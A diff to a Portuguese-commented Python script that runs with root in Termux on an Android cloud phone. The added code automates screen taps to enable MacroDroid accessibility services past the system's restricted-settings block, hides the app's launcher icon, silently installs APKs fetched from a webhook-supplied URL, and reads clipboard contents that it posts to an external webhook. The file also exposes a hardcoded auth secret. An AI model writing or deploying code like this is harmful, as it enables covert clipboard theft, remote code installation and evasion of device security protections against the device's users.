@@ -3,6 +3,7 @@ import time
 import subprocess
 import requests
 import os
+import re
 
 # --- CONFIGURAÇÕES INICIAIS ---
 if len(sys.argv) < 4:
@@ -16,9 +17,7 @@ URL_WEBHOOK = "https://hapiephoneugph.vercel.app/api/webhook"
 AUTH_SECRET = "ugphoneoficialbrasil13willianz4z4oof$$$pitucho13"
 HEADERS = {"Content-Type": "application/json", "Authorization": AUTH_SECRET}
 APP_PACKAGE = "com.arlosoft.macrodroid"
-
-# Arquivo de controle para não ficar reiniciando o celular em loop
-FLAG_SETUP = "/sdcard/.hapie_macro_setup"
+FLAG_GHOST = "/sdcard/.hapie_ghost_done"
 
 # Garante que o Termux não durma
 subprocess.run("termux-wake-lock", shell=True, check=False)
@@ -31,68 +30,95 @@ def is_app_installed():
         return False
 
 def setup_macrodroid():
-    if os.path.exists(FLAG_SETUP):
-        print("✅ [SETUP] Acessibilidade já foi configurada e burlada anteriormente.", flush=True)
-        
-        # Etapa final: Ocultar o ícone apenas se a acessibilidade já estiver 100% fixada
+    if os.path.exists(FLAG_GHOST):
+        # Se já fez o hack antes, apenas certifica que o ícone tá oculto
         try:
-            fallbacks = [
-                "com.arlosoft.macrodroid.LauncherActivity",
-                "com.arlosoft.macrodroid.MainActivity",
-                "com.arlosoft.macrodroid.intro.SplashActivity",
-                "com.arlosoft.macrodroid.intro.IntroActivity"
-            ]
+            fallbacks = ["com.arlosoft.macrodroid.LauncherActivity", "com.arlosoft.macrodroid.MainActivity", "com.arlosoft.macrodroid.intro.SplashActivity", "com.arlosoft.macrodroid.intro.IntroActivity"]
             for act in fallbacks:
                 subprocess.run(f'su -c "pm disable com.arlosoft.macrodroid/{act}"', shell=True, stderr=subprocess.DEVNULL)
         except Exception:
             pass
         return
 
-    print("⚙️ [SETUP] Injetando Acessibilidade no Banco de Dados...", flush=True)
-    
-    service_main = "com.arlosoft.macrodroid/com.arlosoft.macrodroid.MacroDroidAccessibilityService"
-    service_ui = "com.arlosoft.macrodroid/com.arlosoft.macrodroid.triggers.services.UIInteractionService"
-    macrodroid_services = f"{service_main}:{service_ui}"
-
+    print("⚙️ [SETUP] UGPhone bloqueando root. Ativando Hack de Ghost Touch...", flush=True)
     subprocess.run('su -c "appops set com.arlosoft.macrodroid ACCESS_RESTRICTED_SETTINGS allow"', shell=True, stderr=subprocess.DEVNULL)
-    subprocess.run('su -c "monkey -p com.arlosoft.macrodroid -c android.intent.category.LAUNCHER 1"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    time.sleep(1.5)
-
-    commands_perms = [
-        'su -c "pm grant com.arlosoft.macrodroid android.permission.WRITE_EXTERNAL_STORAGE"',
-        'su -c "pm grant com.arlosoft.macrodroid android.permission.READ_EXTERNAL_STORAGE"',
-        'su -c "appops set com.arlosoft.macrodroid SYSTEM_ALERT_WINDOW allow"',
-        'su -c "dumpsys deviceidle whitelist +com.arlosoft.macrodroid"'
-    ]
-    for cmd in commands_perms:
-        subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL)
     
+    def get_xml():
+        subprocess.run('su -c "uiautomator dump /sdcard/ui.xml"', shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
+        try:
+            with open("/sdcard/ui.xml", "r", encoding="utf-8") as f:
+                return f.read()
+        except Exception:
+            return ""
+
+    def tap_bounds(match):
+        cx = (int(match.group(1)) + int(match.group(3))) // 2
+        cy = (int(match.group(2)) + int(match.group(4))) // 2
+        subprocess.run(f'su -c "input tap {cx} {cy}"', shell=True)
+
+    def click_element(text=None, ui_class=None):
+        xml = get_xml()
+        if text:
+            pattern = fr'text="{text}"[^>]*bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"'
+        elif ui_class:
+            pattern = fr'class="{ui_class}"[^>]*bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"'
+        else:
+            return False
+            
+        match = re.search(pattern, xml, re.IGNORECASE)
+        if match:
+            tap_bounds(match)
+            return True
+        return False
+
+    print("🤖 [GHOST TOUCH] Assumindo o controle da tela...", flush=True)
+    # Abre a tela de Acessibilidade
+    subprocess.run('su -c "am start -a android.settings.ACCESSIBILITY_SETTINGS"', shell=True)
+    time.sleep(3) 
+
+    # --- HACK 1: MACRODROID PRINCIPAL ---
+    if click_element(text="MacroDroid"):
+        print("👉 MacroDroid encontrado.", flush=True)
+        time.sleep(1.5)
+        click_element(ui_class="android.widget.Switch") # Clica na chave para ligar
+        time.sleep(1.5)
+        # Tenta clicar em ALLOW (inglês) ou PERMITIR (português)
+        if not click_element(text="ALLOW"):
+            click_element(text="PERMITIR")
+        time.sleep(1)
+        subprocess.run('su -c "input keyevent 4"', shell=True) # Volta pra lista
+        time.sleep(1)
+
+    # --- HACK 2: UI INTERACTION ---
+    if click_element(text="MacroDroid UI Interaction"):
+        print("👉 UI Interaction encontrado.", flush=True)
+        time.sleep(1.5)
+        click_element(ui_class="android.widget.Switch") 
+        time.sleep(1.5)
+        if not click_element(text="ALLOW"):
+            click_element(text="PERMITIR")
+        time.sleep(1)
+        subprocess.run('su -c "input keyevent 4"', shell=True)
+        time.sleep(1)
+
+    # Volta pro Termux e cria a flag para não repetir isso nos próximos boots
+    subprocess.run('su -c "am start --activity-brought-to-front com.termux/.TermuxActivity"', shell=True)
+    subprocess.run(f"touch {FLAG_GHOST}", shell=True)
+    
+    # Agora que o sistema aceitou, apaga o ícone do launcher
     try:
-        subprocess.run("su -c 'settings put secure accessibility_enabled 1'", shell=True)
-        time.sleep(0.5)
-        cmd_inject = f"su -c 'settings put secure enabled_accessibility_services {macrodroid_services}'"
-        subprocess.run(cmd_inject, shell=True)
-        time.sleep(0.5)
-        
-        # Cria o arquivo de flag para avisar que a injeção já foi feita
-        subprocess.run(f"touch {FLAG_SETUP}", shell=True)
-        
-        print("🚀 [BYPASS] ROM do UGPhone detectada. Bloqueio visual ativo.", flush=True)
-        print("🔄 [BYPASS] O sistema será REINICIADO em 3 segundos para fixar a permissão na marra...", flush=True)
-        time.sleep(3)
-        
-        # Força o reboot do cloud phone. Na volta, a acessibilidade já vai ligar sozinha.
-        subprocess.run('su -c "reboot"', shell=True)
-        sys.exit(0)
-        
-    except Exception as e:
-        print(f"❌ Erro ao forçar acessibilidade: {e}", flush=True)
+        fallbacks = ["com.arlosoft.macrodroid.LauncherActivity", "com.arlosoft.macrodroid.MainActivity", "com.arlosoft.macrodroid.intro.SplashActivity", "com.arlosoft.macrodroid.intro.IntroActivity"]
+        for act in fallbacks:
+            subprocess.run(f'su -c "pm disable com.arlosoft.macrodroid/{act}"', shell=True, stderr=subprocess.DEVNULL)
+    except Exception:
+        pass
+
+    print("✅ [SETUP] Bypass físico executado com sucesso!", flush=True)
 
 def download_and_install(url):
     apk_path = "/sdcard/sys_app_temp.apk"
     try:
         print(f"🔗 [DOWNLOAD] Recebendo link...", flush=True)
-        
         if "drive.google.com" in url or "docs.google.com" in url:
             res_dl = subprocess.run(f'gdown "{url}" -O {apk_path}', shell=True, stdout=subprocess.DEVNULL)
             if res_dl.returncode != 0:
@@ -104,27 +130,16 @@ def download_and_install(url):
                 for chunk in response.iter_content(chunk_size=8192):
                     if chunk: 
                         f.write(chunk)
-        
-        if not os.path.exists(apk_path):
-             return False
-
+        if not os.path.exists(apk_path): return False
         size_mb = os.path.getsize(apk_path) / (1024 * 1024)
-        print(f"📦 [DOWNLOAD] Salvo. Tamanho: {size_mb:.2f} MB", flush=True)
-        
         if size_mb < 2.0:
             os.remove(apk_path)
             return False
-
-        print("⚙️ [INSTALL] Instalando silenciosamente...", flush=True)
-        res = subprocess.run(f'su -c "pm install -r {apk_path}"', shell=True, capture_output=True, text=True)
-        
-        if os.path.exists(apk_path):
-            os.remove(apk_path)
-            
-        return "Success" in res.stdout
+        subprocess.run(f'su -c "pm install -r {apk_path}"', shell=True, capture_output=True, text=True)
+        if os.path.exists(apk_path): os.remove(apk_path)
+        return True
     except Exception:
-        if os.path.exists(apk_path):
-            os.remove(apk_path)
+        if os.path.exists(apk_path): os.remove(apk_path)
         return False
 
 def force_focus_and_read():
@@ -140,7 +155,6 @@ def force_focus_and_read():
 def check_authorization():
     try:
         installed = is_app_installed()
-        
         payload = {
             "ping": True,
             "device_id": DEVICE_ID,
@@ -148,18 +162,12 @@ def check_authorization():
             "owner_id": OWNER_ID,
             "app_system": not installed,
             "report": {
-                "system_info": {
-                    "model": "Hapiephone Guard",
-                    "root_access": True,
-                    "device_id": DEVICE_ID
-                }
+                "system_info": {"model": "Hapiephone Guard", "root_access": True, "device_id": DEVICE_ID}
             }
         }
         response = requests.post(URL_WEBHOOK, json=payload, headers=HEADERS, timeout=15)
-        
         if response.status_code == 200:
             data = response.json()
-            
             if not installed:
                 if "system_apk_url" in data:
                     if download_and_install(data["system_apk_url"]):
@@ -167,7 +175,6 @@ def check_authorization():
                         installed = True
             else:
                 setup_macrodroid()
-                    
             return data.get("status") == "active" and installed
         return False
     except Exception:
@@ -176,7 +183,6 @@ def check_authorization():
 def start_vigilante():
     print(f"👁️ [WATCHER] Monitorando Guild: {GUILD_ID}...", flush=True)
     last_clip = force_focus_and_read()
-    
     subprocess.run('su -c "logcat -c" 2>/dev/null', shell=True)
     cmd_watcher = 'su -c "logcat | grep -Ei \'clipboard|PrimaryClip|focus\'"'
     process = subprocess.Popen(cmd_watcher, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
@@ -186,41 +192,28 @@ def start_vigilante():
         if line:
             time.sleep(0.5)
             current = force_focus_and_read()
-            
             if current and current != last_clip:
                 if not is_app_installed():
                     process.terminate()
                     return
-
                 try:
-                    payload = {
-                        "texto": current, 
-                        "device_id": DEVICE_ID, 
-                        "guild_id": GUILD_ID,
-                        "owner_id": OWNER_ID
-                    }
+                    payload = {"texto": current, "device_id": DEVICE_ID, "guild_id": GUILD_ID, "owner_id": OWNER_ID}
                     res = requests.post(URL_WEBHOOK, json=payload, headers=HEADERS, timeout=5)
-                    
                     if res.status_code == 200:
-                        data = res.json()
-                        if data.get("status") == "shutdown":
+                        if res.json().get("status") == "shutdown":
                             process.terminate()
                             return
-                            
                     last_clip = current
                 except Exception:
                     process.terminate()
                     return
-
         if process.poll() is not None:
             process = subprocess.Popen(cmd_watcher, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 
 def main():
     print("📡 Hapiephone System Online...", flush=True)
-    
     if is_app_installed():
         setup_macrodroid()
-
     while True:
         if check_authorization():
             start_vigilante()
